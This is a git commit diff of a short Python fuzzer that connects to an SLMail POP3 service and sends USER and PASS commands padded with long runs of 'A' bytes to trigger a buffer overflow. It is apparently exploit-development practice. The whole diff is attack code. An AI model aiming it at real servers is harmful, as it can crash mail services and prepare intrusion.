0158dacd5274039b6c7efda4abe5dee81a99ce74
Hrishi Ghosalkar <87890571+rookie-cookie-8@users.noreply.github.com>
2024-09-26 13:03:37 +0530

    Update fuzzer-2.py

--- fuzzer-2.py
+++ fuzzer-2.py
@@ -1,30 +1,32 @@
 #!/usr/bin/python3
+
 import sys,socket
 
+print("*******Slmail buffer overflow********")
 ip_address=input("Enter the IP address\n")
-port_number=input("Enter the port number\n")
+port=input("Enter the port numeber\n")
 
 
-if (len(ip_address)<=0) or (len(port_number)<=0):
-    if (len(ip_address)>0) and (len(port_number)<=0):
-        print("*" * 30)
+if (len(ip_address)==0) or (len(port)==0):
+    if (len(ip_address)>0) and (len(port)==0):
+        print("*"*30)
         print("Port number field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)>0):
-        print("*" * 30)
+    elif (len(ip_address)==0) and (len(port)>0):
+        print("*"*30)
         print("IP address field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)<=0):
-        print("*" * 30)
+    elif (len(ip_address)==0) and (len(port)==0):
+        print("*"*30)
         print("IP address field is empty")
         print("Port number field is empty")
     else:
-        print("*" * 30)
+        print("*"*30)
         print("Issues with the user input")
-elif (len(ip_address)>0) and (len(port_number)>0):
-    size=3100
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((ip_address, int(port_number)))
-    s.send(b"USER hrishi" + b"\r\n") 
-    print(f"Buffer size for POP3 PASS --> {size}")
-    s.send(b"PASS " + b"A" * size + b"\r\n") 
-    s.close()
 
+elif (len(ip_address)>0) and (len(port)>0):
+    buffer=1700
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((ip_address,int(port)))
+    print(f"Sending buffer size --> {buffer}")
+    s.send(b"USER HRISHI" + b"\r\n")
+    s.send(b"USER " + b"A" * buffer + b"\r\n")
+    s.close()
